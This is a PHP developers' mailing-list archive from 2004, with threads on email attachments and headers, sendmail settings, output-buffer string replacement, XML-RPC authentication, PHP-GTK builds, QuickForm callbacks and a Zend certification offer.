$ch = curl_init('http://www.target-site.com/');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=example');
curl_exec($ch);
curl_close($ch);
$response = ob_get_contents();
ob_end_clean();

Then you can process the result in $response as you like.

You can omit the output buffering calls if you set
CURLOPT_RETURNTRANSFER to true (or 1).

Message-ID: <40C8D313.30101@adnet-sys.com>

I wrote a custom mail() function that should handle emailing with 
attachments, based upon content I saw in the PHP manual and on 
www.phpbuilder.com:

[PHP]
// ORIGINAL FUNCTION FOUND AT

     $from Sender (like "email at domain.com" or "Name <email at domain.com>")
     $subject Subject
     $message Content
     $files hash-array of files to attach
     $lb is linebreak characters... some mailers need \r\n, others need \n
-------------------------------------------------------------------------------------------------*/
 global $phpVersionInt;
 $mime_boundary = '==Multipart_Boundary_x' . md5(uniqid(mt_rand(), 1)) . 
'x';
 $header = 'From: '. $from;
 if ($cc) $header .= $lb . "Cc: $cc";
 if ($bcc && (int)$phpVersionInt > 430) $header .= $lb . "Bcc: $bcc";

 // Add the headers for a file attachment
 $headers .= "\nMIME-Version: 1.0\n" .
                      "Content-Type: multipart/mixed;\n" .
                      " boundary=\"{$mime_boundary}\"";

 if (is_array($files)) {
  $header.= $lb .
                    "\nMIME-Version: 1.0$lb" .
                    "\nContent-Type: multipart/mixed;\n" .
                    " boundary=\"$mime_boundary\"\n";
  $content = "This is a multi-part message in MIME format.\n\n" .
                      "--$mime_boundary\n" .
                      "Content-Type: text/plain; charset=\"iso-8859-1\"\n" .
                      "Content-Transfer-Encoding: 7bit\n\n";
 }
 $content .= "$message\n";

 if (is_array($files)) {
  $content.= "--{$mime_boundary}\n";
  foreach ($files as $filename => $filelocation) {
   if (is_readable($filelocation) && is_file($filelocation)) {
    $fileID = @fopen($filelocation);
    $data = @fread($fileID, filesize($filelocation));
    @fclose($fileID);
    $data = chunk_split(base64_encode($data));
    // Add file attachment to the message
    $message .= "--{$mime_boundary}\n" .
                         'Content-Type: ' . 
mime_content_type($filelocation) . ";\n" .
                         " name=\"{$filename}\"\n" .
                         "Content-Disposition: attachment;\n" .
                         " filename=\"{$filename}\"\n" .
                         "Content-Transfer-Encoding: base64\n\n" .
                         $data . "\n\n" .
                         "--{$mime_boundary}--\n";
   }
  }
 }
 if (mail($to, $subject, $content, $header)) return true;
 return false;
}
[/PHP]

However, upon utilizing this function, the site that calls it crashes, 
mail is never delivered and resources are locked for a good 5 minutes or 
more!

I checked my mail settings in php.ini and they seem utterly standard:

sendmail_path = /usr/sbin/sendmail -t -i

I am figuring that it might be in the way I'm writing the headers but 
can't verify that either.  Ideas welcomed, I can't borrow however as 
this is governmental and by regulation everything has to be 100% 
custom.  Go figure.

Thanx
Phil

PEAR's HTTP_Request (http://pear.php.net/package/HTTP_Request) presents a

 -        Problem lies in "mime_content_type" it's not a good function even
 if you have magic.mime... not to mention if you do not have it.
    It's sort of undocumented function : "Returns the MIME content type for
a
 file as determined by using information from the magic.mime file. Content
 types are returned in MIME format, like text/plain or
 application/octet-stream."
         But it says not what happens if it fails... or if the file has an
 unrecognizable mime. Try to use something else

 -        You're using a custom line break  although in PHP manual says:
"You
 must use \r\n to separate headers, although some Unix mail transfer agents
 may work with just a single newline (\n)." Also note SMTP and MINE

 (RFC821/822 and ancestors) that require messages to have  \r\n . :)

 -         You do not have a charset definition in header: <start>
 Content-Type: text/plain; charset="iso-8859-1" </end>

 -         If your mail server requires authentication you need to
 communicate directly via sockets.

 -        A misssssconfigured SENDMAIL cand return false if it has some
 errors... even though the mail was sent...
 -        Take note that RFC 821 prohibits lines longer than 998 bytes.

 -        Speed-wize you should notice that mail() is extreeeeemly slower
 that "sockets"... if you send many emails in a loop PHP opens and closes a
 connection for every mai lyou send... compared with sockets when (if you
 write good code) you have only one connection opened and multiple mail
 sent...


 With all these problems... found in 5 minutes.. .what if I would have spent
 30 mins or 1 day...

 It's amaizing that we are able to send mail... :))

In this post I neglected to mention the need to change php.ini so that the
sendmail parameters can be passed.  Here is the updated post.

Mike

--------------------------------------------------------------------------

I have some issues along these lines but made a few changes in the way PHP
interfaces with sendmail.  Here are the key changes:


1. Set the from address in sendmail before you use it and set delivery mode
to defer.  Make sure your from address is a trusted user of sendmail to
suppress the warning of identity change.

$fromaddress='info at yourdomain.com'
		putenv("PHP_SENDMAILPARAMS= -O DeliveryMode=defer -f
$fromaddress");

Change the sendmail_path line in php.ini to read:

sendmail_path   =       /usr/lib/sendmail -t -i $PHP_SENDMAILPARAMS     



2. Build your lists and use the regular ole mail command

			$datasent=mail($toaddress, $subject,
$bodytext, "From: ".$fromaddress."\r\n"
			     ."Bcc:".$addbcc."\r\n"
				."Reply-To: ".$fromaddress."\r\n"
				."Errors-To: <".$fromaddress.">"."\r\n"
				."X-Mailer: PHP/" . phpversion());

3.Flush the queue or just wait for sendmail's natural queue flush (depends
on how you have this setup and how quickly you need to process the queue)

$processq=exec('/usr/lib/sendmail -q >/dev/null &');

Making these changes made email broadcasts practical and is 100 x faster
than the default setup where php waits for sendmail to deliver.

Hope this helps

Mike

Subject: [nycphp-talk] dynamic string manipulation when web serving - best
 practices and ideas?
Message-ID: <28230-40015@sneakemail.com>

I would like to ask you all what are recommended techniques for dynamic 
string manipulation/insertion on my website in an AMP environment.

I have an existing mysql database of content "blah blah blah, ad nausium 
blah blah blah" served by various dynamic pages, and would like to 
modify replace certain string content under certain conditions.

I want some display-related parsing, such as "blah blah blah, <strong>ad 
nausium</strong> blah blah blah" on certain pages
I want some addition stuff in other places "blah blah blah, ad nausium 
(Ticker: <a href="">AdNaus</a>)  blah blah blah" on other pages
or outright replacement in some cases "blah blah blah, Argumentum ad 
Misericordiam  blah blah blah"
I want some security/graphic manipulations on other pages "blah blah 
blah" . <?php echo(WriteUsingGD("ad nausium")); ?> . "&nbsp; blah blah 
blah" on other pages

but in general it is always "watch for the string 'ad nauseum' and if 
you see it, do THIS before sending out to browser" where THIS may be 
generalized as a predefind (currently PHP) function on said string. The 
database text content is relatively static, while the desired 
manipulations (functions) will change frequently.

Where is it "best" to watch for/modify this content? Should it be tagged 
and post-processed, or can it be modified at the mysql query level? 
Stored procedure? Can Apache do it - with hooks back into php?

I desire to stay within AMP. Currently it is custom php coding for each 
page type served.  Thanks for any comments/suggestions/examples

Thanx for your tips.  I should have let you know that 
"mime_content_type" is custom in my case as my instance of PHP does not

 best practices and ideas?
Message-ID: <40C9E0B4.2020602@ceruleansky.com>

Hello,

I would say that the easiest way to do this would be to use (the 
built-in PHP function) str_replace() after you have run the query.

For example, suppose you have the following table:

id | title | desc
---|-------|-----
1  | bob   | nickname

Your goal is to replace "bob" with "Robert" when it appears in the title 
field.

So, a PHP function runs the following query:
SELECT title FROM mytable WHERE id='1'

[...]

Then , you do something like:
$title = str_replace("bob", "Robert", $title);

Later, if you want "bob" to be replaced with "Roberta", you could just do:
$title = str_replace("bob", "Roberta", $title);

I know my answer seems a bit simplistic; I hope I understood the nature 
of your question correctly - perhaps their are more complex replacement 
that you'd like to do.

In any case, PHP has more than enough search and replace features - so I 
would do the replacement from within PHP (and not in the SQL query or 
elsewhere).

Best Regards,

- Jay

If your code is messy and it would be too tedious going through and
doing str_replace's, you might want to write an buffer handler that does 
a search/replace
on the output buffer. This script could include'd at the top of each php 
script.

See: http://www.php.net/manual/en/ref.outcontrol.php
for more info.

Thanks for the suggestion. This approach is great for coding a 
particular page/template (php string functions are tremendous) but I 
suspect there is a more systematic solution that would allow such string 
replacements to be performed on all pages that match some criteria - 
systematic and site wide - perhaps even outside of PHP. The idea is that 
since only the rulesets and the database data will change, I don't want 
ot edit the page code. I suppose a set of INCLUDEs for the php 
processing could be used (Case ONE below) but is that the best way?

i.e. for Normal Page type = "X" (repeat for any other "type" of page 
which has a different strng processing ruleset):

Case ONE:
<mysql does SELECT>                         // never changes
<php filters and manipulate string content according to Ruleset for Page 
Type "X">   // <-- your str_replace + substr+whatever code
<php completes any other php work>    // never changes
<Apache deliver page>                           // never changes

CASE TWO:
<mysql does SELECT>                         // never changes
<php completes any other php work>     // never changes
<return control to Apache>                     // never changes
<Apache autoreplaces/strips/filters according to Ruleset for Page Type 
"X">  // <-- here lies the question. Can pass to external PHP scripts or 
something?
<Apache delivers page>                         // never changes

or maybe

CASE THREE:
<mysql does SELECT with a  manipulation according to Ruleset for Page 
Type "X">  // <-- here lies the question. Is MySQL a good choice for 
doing this, and if yes, how?
<php completes any other php work>     // never changes
<return control to Apache>                     // never changes
<Apache delivers page>                         // never changes

Are case 2 and 3 viable options? Aside from developer preference, is any 
one of these three offer significant benefits over the others? I 
consider maintaining the custom PHP code for each page type a draw back, 
as only the content and the filter/replace rulesets will be changing in 
this application (nothing else in the page code).

I hope that is clearer....

Excellent, thanks. I didn't know output buffering was re-entrant. Can 
anyone comment on the performance issues of re-entrant use site wide 
(every page would be processed through at least one layer of output 
buffering.... a nice way to preserve the original code base, but at what 
performance cost?

Sounds like you need to do more than something simple (like a template 
engine), if you want to play around with sticking a template inside of 
mysql you can call it like:

"select replace(db.field, "foo", "bar") from db.template"

MySQL has alot of basic string commands for finding an index, replacing, 
inserting, etc ... so technically you can create a SQL statement which 
throws a set @ a query to produce a template if you just wanted to use the 
DB.

On a side note I thought with 4.1 you could subselect the replacement but 
I just tried and I guess that's not the case :-\

Hi all,

I just came across Achievo ATK: http://www.achievo.org/atk/
Achievo ATK is an object oriented Web-application Framework, written in PHP.
I've only been looking at the examples / docs for about 20 minutes, but 
it looks very impressive.

Has anyone here used it or know anything about it other than the info on 
the site?

Thanx

Well, here's one for the books.. "\r\n" fails (email is either mangled 
or never sent at all!), but "\n" works just fine!

So I can't use \r\n to separate headers even though it's required for me 
to do so!

I've never had much luck using \r\n in HTTP or email headers either - just at the beginning MIME header... this snippet is from my email class, wich has never given me any problems:


 if (count($this->attach) > 0) {
    $mime_boundary = "==Multipart_Boundary_".md5(uniqid(""));
    $headers = "\r\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"$mime_boundary\"";
    $message = "This is a multi-part message in MIME format.\n\n";
    $message .= "--$mime_boundary\n";
    $message .= "Content-Type: text/plain; charset=\"iso-8859-1\"\n";

Message-ID: <20040611233715.BE9DEA860A@virtu.nyphp.org>

All,

 

I using session_start() to instantiate the session inside in include page at the top of all pages. 

When I click on a link from page1.php that passes arguments like: page2.php?x=1&y=2 and then use my back button to return to page1.php I get a page expired warning from the browser as if I made a form submission. Without the session_start() it works fine. 

 

Any thoughts help you be great!

 

Cheers,

Peter

Pretty sweet ...

Im just curious, Do you know offhand if there will ever be an upgrade to 
glib2?  Either w/ php4 or php5?  Or does such a package exist in hiding 
somewhere ...

Is your code a lib package of some kind or a tutorial?

Subject: [nycphp-talk] Authentication with XML-RPC 
Message-ID: <40CB0B98.8000308@ceruleansky.com>

Hello Adam and Max,

thanks very much for your responses to my question regarding 
authentication with XML-RPC. Sorry for the delayed response.

Adam, I just posted a review to Amazon. It might take a while to appear, 
but here is what I wrote:

----
David Sklar has written a book on a subject that most other PHP authors 
have ignored, and which many PHP programmers have failed to consider: 
how using pre-made, existing libraries effectively can save you hours of 
writing (and re-writing) PHP code.

There are many external libraries available to PHP, some under the PEAR 
brand ( http://pear.php.net ) and others by individual authors or 
companies.

If you would like to automate the creation, processing and validatin of 
form processing, there's HTML_QuickForm. If you'd like to implement a 
templating system to separate presentation logic from other programming 
logic, there's Smarty. If you would like to setup a lightweight, yet 
completely usable and effective web services platform, there's the PEAR 
XML-RPC library.

In many of these case, the online documentation is too complicated or 
technical (e.g. HTML_QuickForm) or too skimpy (PEAR XML-RPC). Enter 
David Sklar's book!

David uses concise, clear language with plenty of examples to explain 
how a certain library works. He goes through it step-by-step, first with 
a paragraph of descriptive text, then with a snippet of code elucidating 
what was previously mentioned.

He manages to cover just enough ground to enable you to grasp how to use 
a certain library without boring you to tears with extraneous, 
non-essential information.

If you would like to avoid re-inventing the wheel and the  introduction 
of bugs (that almost always follows the insertion of new, untested 
code), I suggest you procure a copy of Essential PHP Tools today, and 
read it cover-to-cover!
----

Max, thank you for your offer of examples and help. Any examples that 
you can provide would be helpful, but I did uncover something 
interesting at the PEAR website documentation page for the XML-RPC 
library ( 
http://pear.php.net/manual/en/package.webservices.xml-rpc.api.php ):

there is a setCredentials method, which (apparently) allows you to 
specify the username and password required to POST to an htaccess 
protected PHP (XML-RPC Server) file -

"setCredentials

$client->setCredentials ($username, $password)

This method sets the username and password for authorizing the client to 
a server. With the default (HTTP) transport, this information is used 
for HTTP Basic authorization."

I hope I am understanding this correctly. If I did, then I think it 
would work like this. Suppose I uploaded the XML-RPC server part of the 
script to http://www.mydomain.com/server/server.php
then I would have to protect the files in the "server" directory with an 
htaccess username and password. Then, when the client version of the 
XML-RPC script (say, residing on http://localhost/client/client.php) 
tries to POST an XML request to 
http://www.mydomain.com/server/server.php, it will need to know the 
htacess username and password in order to do so.

Here is the relevant code from the XML-RPC class (with only some 
relevant information left in):

------
[from RPC.php]

function setCredentials($u, $p)
     {
         $this->username = $u;
         $this->password = $p;
     }
  // [...]

function sendPayloadHTTP10($msg, $server, $port, $timeout=0,
                                $username = "", $password = "")
     {

  // [...]

         $credentials = "";
         if ($username != "") {
             $credentials = "Authorization: Basic " .
                 base64_encode($username . ":" . $password) . "\r\n";
         }

   // [...]
   }

------

Initially I was worried about maintaining "state" so that the XML-RPC 
client would not have to resend the password each time to the XML-RPC 
server. But, then I realized that when a browser accesses an htaccess 
protected site, it just caches the username and password and resends it 
on each request to the site. So, since the XML-RPC client is a PHP 
script too, it can also (conceivably) read the username and password and 
resend it each time an XML POST is made.

Sytems like PEAR's Auth library use cookies / sessions to keep track of 
logged in users, and users do not want to keep reentering their 
usernames and passwords. But in the case of a programmatic XML-RPC 
client, maybe this simple approach will work ...

I still have not tried any of this yet, but I plan to base my prototype 
on this good article by Harry Fuecks:

http://www.sitepoint.com/print/own-web-service-php-xml-rpc

He is using Keith Devens' library - but Fueck's sample code does not 
work on my  version of PHP (4.3.2). Something about ... "Call-time 
pass-by-reference" having been "deprecated". I am not sure what that is 
all about (I probably should know ...), but if anyone has an idea, 
please let me know.

Sorry for being long-winded here - but I had a lot of stuff to get in. 
Maybe I should have made multiple emails for each subject. Next time (I 
promise).

Best Regards,

- Jay

Awesome review! It really helps others understand the virtues of the
book, and why the book will makes their PHP lives happier. :)

It will mostly just be on my dev blog, a kind of tutorial though not as
extensive as the ones I have done for zend, just a kind of "I assume you
know php and here is the code, and here is an explanation of some of the
funky stuff" etc..

As for php5, I tried and tried and they have a package that "supposedly"
works but did not for me, they are planning on releasing the php-gtk for
gtk2/php5 sometime this summer/early fall from what I can gather.

Anyway, great fun.

At the risk of provoking flames for saying "me too:"  Hear hear! Nice job
on that review, Jayesh. I recently picked up Essential PHP Tools myself
and was planning to contribute a review to BookPool (where I got it)
and/or Amazon -- probably I still will -- but I'm glad you beat me to it.
I have yet to read more than a few pages so didn't feel ready to opine
formally. But so far, it's terrific. Extraordinary clarity and simplicity,
but without talking down. Packed solid with good stuff. And, not
infrequently, it's funny -- like all technical writing ought to be (-:

Way to go, Sklar!

Subject: [nycphp-talk] How to display LimitRequestBody Value in
	/etc/httpd/conf.d/php.conf
Message-ID: <40CDEA84.20403@adnet-sys.com>

I'd like to be able to display the amount found in the LimitRequestBody 
value that is set in /etc/httpd/conf.d/php.conf.  I know the default 
value is 524288 bytes or so, but what if the admin changes that value; 
my application is portable and could be in multiple environments where 
LimitRequestBody might have a different value?

I already have my settings in MAX_FILE_SIZE to handle maximum size; I 
even include a smaller local instance that I check server-side to ensure 
that it's (for now at) 100K.  However, if the user attempts to upload 
anything more than 524288 bytes in size it will bomb out before it even 
gets to my redirection URL handling the error:

1) Mozilla Firefox: produces "Document contains no data" error alert 
client-side message
2) Konqueror: produces a local Konqueror error page with no error 
description

I thought it would be best since these seem to be handled from the 
client (thus, nothing I can do about everybody's client browsers) to 
display a message indicating that their browser will not accept an 
upload of more than $LimitRequestBytes bytes in size.

Thanx
Phil

Uggg I sat up all night mucking around with glib crap and finally got back to where I 
was and compiled it, it is very cool + Im going to embark on GUI-land stuff ... a few 
brief thoughts:

Initially when you compile PHP/GTK it can be very daunting, like you I came back to it 
after ncurses and after installing a pretty fluxbox I couldnt resist but I think alot 
of people have problems compiling ... for example:

You seem to need to ./buildconf, then aclocal, then ./buildconf again, which was not in 
the install docs but pointing out by a few people ... and I read a list where some poor 
guy was trying to compile it without using the CLI version of PHP ... (no it wasnt me - 
but then again I wouldnt be suprised :-)  

I like the combo considering it moves 1000x faster than Swing + remains cross 
compatible ... 

Thank you for the tutorial!

Very nice. I have been trying to figure out how to do image transparency 
for a while now with little success.  One thing I am confused about 
though is when you call timeout_add:

// add in a one second update
gtk::timeout_add(1000, 'updateview', $clist); // this updates us every 
second

I know that $clist is going to be passed to updateview but updateview 
expects an image right?  Also I don't see where $clist is define.

Anyway, do you mind if I forward this link on to the PHP-GTK general 
mailing list?  I think a lot of people over there will find this very 
interesting.

Thanks,
Scott Mattocks

Sure sent it off..
I am currently working on using this same effect and the mouse wheel to
have alpha-blending via the xpm's .. this totally bypasses X and the
need for some other app like xdirectfb.

$clist I think is actually not necessary.
however, I will need to go dig around back in my code to say for
certain.

This tutorial made it to developers.slashdot.org as well..

I had the same issues.
I run gentoo and keep everything very up to date so I had all kinds of
problems, I also have php5 installed here.
'Finally' (after hours and hours) I found a binary distribution compiled
up which I cannot find the site for again but have posted for you here:
http://lucifer.intercosmos.net/php-gtk.tar.gz

It is super easy to do (read the README)  and works fine with php5 as it
sits as the CLI version and you can keep your regular version intact.

Hope that helps.

Speaking of which, does any use Glade for UI for php-gtk?  

Alot of the docs/info seem to be lacking for php-gtk but Im assuming they 
are relative to normal Gnome/GTK docs that already exist, is that correct?

I was reading over Andrei's blog and there seems to be only one book (in 
Spanish) in regards to PHP-GTK, is it covered in depth anywhere else? (I 
have not bought Essentials yet).

It would seem nice to have libglade bundled, am I wrong?

LOL ... I just spent hours and hours - I think I have the same setup on 
Fedora w/ PHP5 here - my main issue I think was that I had the newest 
version of libglade installed as well as the old and had to 
--disable-glade to get it going ... 

My main issue now is some of the PixMap controls not working, I will try 
out your version as Im sure it solves alot of my problems, thanks again 
...

This is great ... if you rip out all the examples you basically have a 
Linux runtime, it turned out the CLI i had was able to run all the 
examples as is, which was a good sign I guess.  That package should be 
made more widely available, Ive seen alot of people on lists have 
compiling problems ...

Thanks Joel, great examples in that package, it will keep me busy for a 
while ...

Will probably cost a small fortune for something I've heard isn't a big

yourself. There are instructions on the web.

Hi Hans,

(Oops - I sent this initially to your private email address first by 
mistake, sorry about that. I want to keep the others in the loop too, 
regarding this ...)

thanks for the note. I would be happy to update / expand the review (of 
David Sklar's book) for nyphp.org. (I could also do reviews for other 
PHP/ MySQL/ Web Application Development/ CSS books which I have read.)

I tried sending a message to notjunk at nyphp.org, but it bounced back ...

Best Regards,

- Jay

Gentlemen:  thank you. These are fine ideas. I've mucked around inside
desktop machines plenty, but always assumed laptops were dark magic. Bah!
Time to go for it.

Plug in a regular keyboard? D'oh! I definitely get the Homer Simpson
Award.

Subject: [nycphp-talk] mystery parameter for process method in PEAR
	HTML_QuickForm
Message-ID: <40CFC198.4020500@ceruleansky.com>

Hello all,

I have reading up on the PEAR HTML_QuickForm library, and trying to use 
it in a new (prototype of an) application.

I have been reading David Sklar's book, and reading through his online 
presentation, but still some questions remain unanswered.

Perhaps some of you on this will have answer to this question:

In the slide at this address - 
http://www.sklar.com/talks/show.php/nyphp-quickform/5 - there is this 
snippet of code:

$form->process('say_hello');
/* ... */

function say_hello($data) {
     print 'Hello, ' . $data['my_name'];
}

So, my question is this: when the callback function say_hello() was 
specified in the statement "$form->process('say_hello');" no parameter 
seems to have been passed to it (explicitly, that is).

But, in this example, the something like the following output is 
expected to be printed:

Hello, Jay

where "Jay" is the value of the name entered into the name input box 
(the code for which is not shown above).

So, where does the $data information come from? Is it somehow implicitly 
passed through to the say_hello() callback function when the 
"$form->process('say_hello');" statement is made?

The code for the process method from the HTML/QuickForm.php file is as 
follows:
// *****************************************************
/**
      * Performs the form data processing
      *
      * @param    mixed     $callback        Callback, either function 
name or array(&$object, 'method')
      * @param    bool      $mergeFiles      Whether uploaded files 
should be processed too
      * @since    1.0
      * @access   public
      * @throws   HTML_QuickForm_Error
      */
     function process($callback, $mergeFiles = true)
     {
         if (!is_callable($callback)) {
             return PEAR::raiseError(null, QUICKFORM_INVALID_PROCESS, 
null, E_USER_WARNING, "Callback function does not exist in 
QuickForm::process()", 'HTML_QuickForm_Error', true);
         }
         $values = ($mergeFiles === true) ? 
HTML_QuickForm::arrayMerge($this->_submitValues, $this->_submitFiles) : 
$this->_submitValues;
         return call_user_func($callback, $values);
     } // end func process

Yes, the line:

$form->process('say_hello');

is basically telling HTML_Quickform to grab all the submitted data from 
the form and send it as the first parameter ($data) to the 'say_hello' 
function.

In the code below, the line:

return call_user_func($callback, $values);

is equivalent to:

return $callback($values);

or:

return say_hello($values);

where $values is the data you submitted to the form.

Hi Dan,

thanks a lot for your explanation. It all makes sense now. I hadn't seen 
the call_user_func() thing before.

I guess PHP has the unusual concept of "user defined" or "variable" 
functions (I remember seeing something similar in the lib/main.php file 
of WikkiTikkiTavi) ... and it is passing the array of submitted data as 
a parameter to whatever the user-defined call-back function is.

It's a bit tricky, but it does seem to make sense now ...

Thanks again for your quick help!

Best Regards,

- Jay

I'm always happy to help a fellow (confused) programmer. ;)

The idea of variable functions and using a variable as a function name 
is kind of weird, but can also allow you to do some cool tricks.

Personally I like to check with is_callable before I use a variable 
function name, just to make sure the function actually does exist, but 
other than that I don't know of any gotchas with this technique.

This is an old school programming convention. In LISP people often
define functions on the fly and invoke them.

I actually find myself more frequently using call_user_func_array()
than plain old call_user_func() because it allows you to more easily
call functions with an arbitrary number of parameters.

In particular, it's super useful for object aggregation in PHP 5 when
you invoke it within __call().

Yeah, the good old 'anonymous' or 'lambda' function, very useful for 
little jobs... The majority of php programmers have probably used 
create_function (http://php.net/create_function) at one time or another, 
if only for feeding it to array_(map|reduce|walk) or usort.

Unfortunately, create_function is (was?) very slow. It's much faster
to pre-define the function in PHP. Not so in LISP, which has a highly
optimized eval() nature.

If you like call_user_func_array then you will love safe_args, I've been 
working on it with Dan Kuykendall (of phpGroupWare) as a different way 
of handling function arguments.

For example, say you had a function like:

function myfunc ($a, $b, $c)
{
   ...
}

When defining the function it allows you to define which arguments are 
mandatory and which are optional, default values for optional arguments 
and acceptable data types.

The code using safe_args would look like:

function myfunc ()
{
   $args = new safe_args();
   $args->set('a',REQUIRED,'any');
   $args->set('b',REQUIRED,'any');
   $args->set('c',REQUIRED,'any');
   $args = $args->get($func_get_args());

   ...
}

You then access each argument within the function as $args['a'], 
$args['b'], etc.

As you can see above the definition for each argument includes the name, 
the default value (or REQUIRED) and the type.

When calling the function above you could call it with:

myfunc($my_a,$my_b,$my_c);

or

myfunc(array($my_a,$my_b,$my_c));

or

myfunc(array('b'=>$my_b,'a'=>$my_a,'c'=>$my_c));

It took a little getting used to, but now I love the flexibility it 
offers, as well as the ability to enforce input validation rules with 
little effort.

I just couldn't help noticing that 
Google touts Gmail as easy to use because:

"Keep it all in context.
Each message is grouped with all its replies and displayed as a
conversation."
https://gmail.google.com/?dest=http%3A%2F%2Fgmail.google.com%2Fgmail

Does that mean they've built (or are building) 
Conversationally Linked Email? 

No matter, unless they find a way to thread the email 
with other writings, they won't have a Clew...

I recently inherited a PHP app that relies on shell environment variables
(shudder) for some key settings.

I'm using a fresh install of PHP 4.3.7 with php-recommended.ini. phpinfo() is
listing the environment variables correctly (under "Environment") but the $_ENV
array is empty when accessed in a script.

What gives? Am I missing the crucial ini setting that turns on $_ENV?

Thanks,

Does your variables_order have "E" in it?  If not, add it.

I'm in a similar situation.  Even with E enabled, the TEMP and TMP 
environment vars don't show up in $_ENV.  I'm running PHP 4 as a CGI 
under Apache on Windows 2000.  Any ideas?

Thanks,

But getenv() works?

I'm completely out of my league here (CGI), but have you tried using a PassEnv
directive in httpd.conf?

http://httpd.apache.org/docs/mod/mod_env.html#passenv

Something like "PassEnv TEMP" should make $_SERVER['TEMP'] available in PHP.

Exactly.  I've tried it and wasn't very impressed.  For one, aside from
mailing lists, threaded email isn't that useful.  When I'm chatting with
my buddy, I delete the previous message anyway, and I saw gmail break
the thread incorrectly a couple of times.

They have some hot frontend css/js though  :)

Hey, if you want to check out a really hot front end for webmail,
give oddpost.com a try. They have a free trial now.

Yahoo doesn't seem to be throwing in the towel yet. It'd been a few days
since I checked my Yahoo mail and found a pleasent new interface, more
storage, and the ability to send larger emails. Scarey actually, larger
spam. ;) So while google works on their Gmail privately, Yahoo makes a
public plee for help.

Moo,
Shawn

Of course, if you factor in Blogger, there's a heck of a lot of 
potential there...

Yes, and if they semantically weave blogs 
into the mail, then we will have been (almost)
'beaten to the punch'.

Other writings in Clew, at least in terms of the 
name, was meant to primarily cover blogging. I think Clew 
in its implementation may have become more ambitious and 
may have expanded to cover practically any resource document.  
(will have to check the non-existent design docs 
 on that)

'Other writings' was originally picked because it is 
somewhat vague and thus could cover, in a quasi-extensible 
way, any 'next big things'.

(well that and the fact that C.L.E.B. didn't have 
 a very good 'ring' to it)

Okay I tried going over there.

I got thrown four or five cookies 
(I didn't really count them -- 
 it just seemed I had to answer no
  many time to an IE privacy alert msg box)

One of the cookies wouldn't say what it 
was going to use the cookie info for -- 
you know, no privacy policy information.

One cookie did say what its information 
was going to be used for. It was from hitbox. 
(of course very few times, if ever, does anyone  
take the time and to try actually check and see if people 
are 'living up' to what they promise in terms of 
their privacy policy anyway so maybe the point is 
moot)

Hitbox cookies have a pretty big 'clot factor' 
('clot factor' is a measure of how much something 
gums up a machine running windows by adding registry entries, 
files, and directories -- basically gunk)

I didn't check all the cookies to see which ones were 
coming from hitbox (there are about a half a dozen or 
so possible cookies they might send),
I just said no to any more cookies.

Of course I could remove this gunk (or clot) later 
when my browser starts to clog and bog down. 

Then I got a 'friendly' message box informing me 
that outpost couldn't function properly with the 
way my browser settings were configured.

And it gave me step by step instructions on how 
to hand over root privileges to them -- people 
I don't know.

( I know I could log in as a lesser privileged 
user to XP for browsing -- but who has the time for 
that?)

Actually there are some rather nasty exploits 
(which are published nevertheless) available to 
malicious intruders of your machine via 
Internet Explorer -- which Microsoft knows about.
(I think there is an SP2 patch ready or near 
ready from Microsoft to combat the security holes)

The point is you might want to refrain from 
running active-x controls until you get the 
new patch.

Apologies in advance -- I know this is not 
a windows list. Still the advice to not 
run active-x controls probably will be of 
value to many on this list.

Clot factor.. that is an interesting one.
I've never considered cookies to be something that could
bog down the OS or a security threat. ActiveX is totally another
story though..  My primary browser of choice is Opera. Unfortunately, I 
had to
fire up IE to give oddpost a try. The interface is nice... a little more
than you would expect from webmail (thanks to that extra non-standard 
functionality
MS throws into their browser). I don't plan to pay for the service since
Thunderbird + Squirremail do the job just fine as is.. but in reply
to Hans' comment about gmail's nice interface, I thought I'd bring up 
the service
an alternate comparison.

Message-ID: <013d01c45499$fa0b71c0$7201a8c0@iifwp.local>

Hi Folks,

I'm about to begin a little project to analyze our network speed by logging
periodic ping requests and then graphing the results over a period of time.
It's a curiousity I have, and it seems like a good excuse to learn a little
about php for graphs.

Can anybody recommend an existing class that would help me do this without
writing code from scratch?  I have zero PEAR experience, so this might also
be my chance to learn more about that, too.

Thanks in advance,
Allen

JpGraph is excellent class library for generating graphs, IMO.  Its well
written, very well documented, and comes with an extensive set of examples.

No but even if I did I probably would have written the other one anyway. 
  I just wanted to play with dynamic image creation.

Subject: [nycphp-talk] Zend PHP Certification
Message-ID: <7ac626ed040617170817f55c6f@mail.gmail.com>

NYPHP List:
This email was sent out to selected Zend clients. Due to requests from
individuals from this group I would like to extend the offer to NYPHP.
Please don't hesitate to contact me at daniel at zend.com with any
questions you many have.

Best,
Daniel


Dear PHPer,

As the PHP company, Zend has been approached by many asking it to
establish an industry standard that recognizes PHP expertise. In order
to do that Zend has partnered with PHP experts worldwide to create the
Zend PHP certification exam. The Zend PHP Education Advisory Board has
specified a curriculum essential to demonstrate expert proficiency in
PHP.


Benefits of Becoming a Zend Certified PHP Programmer 
====================================================
In today's competitive market, it's more difficult than ever to stand
out from the competition. The Zend PHP Certification credential offers
a variety of benefits:
- Differentiate yourself from competitors when looking for a new job
or at your annual salary review
- Get your resume noticed
- Gain recognition from your employer
- Have your profile displayed in Zend's "Yellow Pages for PHP Professionals"


Who's on the Zend PHP Education Advisory Board?
==============================================
Andi Gutmans
Chris Shiflett
Damien Seguy
Daniel Kushner
David Sklar
Derick Rethans
George Schlossnagle
John Coggeshall
Marco Tabini
Marcus Boerger
Martin Jansen
Zeev Suraski

As with any certification of this magnitude, the test questions need to be
checked for clarity and performance by means of a beta exam. The beta exam
consists of up to 110 questions instead of just 70 that will make it to the
final exam. Those who take the beta will qualify for the Zend PHP
Certification once we know which questions will be in the final exam and if
enough questions were answered correctly - the passing score will be
determined after the beta analysis.

I would like to invite you to take the beta exam available on June 21st
through June 30th. The cost of the exam is only $80 as opposed to the final
examination fee of $200.

Beta exams are limited so I urge you to sign up as soon as possible to
reserve a place at a test center near you. 

Visit http://www.vue.com/zend/ to register for the beta.

What will be tested?

It is possible to generate a movie with the images in it using the ming
extension:
http://ming.sourceforge.net/
http://www.php.net/ming

But it can be pretty tedious, and ming is still in an early beta.  Also, to
have it programmatically compile the movie on every load could prove to be a
bit heavy.

I'd recommend your server's file system.  Create a cms of sorts for the file
management (file upload, maybe ImageMagick for resizing / cropping), store
the image locations in a db (or not) then generate some output for flash to
pickup the image urls either by using the db query or just a directory
listing of you uploaded images dir.

If you're just going the directory route, you could even ftp the files up
and just use php for outputting the filenames and locations.

